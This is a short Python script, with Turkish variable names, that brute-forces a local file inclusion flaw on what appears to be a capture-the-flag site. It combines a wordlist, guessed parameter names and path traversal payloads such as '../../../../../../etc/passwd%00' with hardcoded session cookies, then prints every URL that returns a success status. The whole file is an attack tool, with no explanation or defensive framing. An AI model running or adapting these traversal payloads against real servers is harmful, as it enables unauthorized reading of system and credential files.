#encoding:utf-8
import requests
import itertools
import re
kelimeDosyasi='tahminler4.lst'
site=('https://demirci.siberkuvvet.com/lfi-2d92b4f3e241ccfc2630f692e9356fdb')
headerss = {'host': 'demirci.siberkuvvet.com'}
cook={'__cfduid':"dc60ecdbbbb24856ad36f49f7679b23451507046428","_ga":"GA1.2.10431879.1507046431","_gid":"GA1.2.730065849.1511356664","PHPSESSID":"sb8smpbmv487b9ov0fq5uh7ag7",'_gat':"1"}
uzanti=["",".php",".aspx",".html","../../../../../../etc/passwd","../../../../../../etc/passwd%00","../../../../../../etc/gizli","../../../../../../etc/gizli%00","../../../../../../gizli","../../../../../../gizli%00",""]
a="yonetici.php"
sDegiskenleri=["s","sayfa","sayfalar","k","kullanici","kullanicilar","u","user","users","p","page","pages","gizli","baslik","yer","alan","liste","listeler","lists","kisi","kisiler"]
with open(kelimeDosyasi) as f:
    tumListe=f.readlines()
for kelime in tumListe:
    kelime=kelime.replace("\n","")
    for i in sDegiskenleri:
        for j in uzanti:
            url=site +'/'+ a +'?'+ i +'='+kelime+j
	    r=requests.post(url,cookies=cook)
            b=str(r)
            if b[11]=='2':
                print(url,r)
         
	
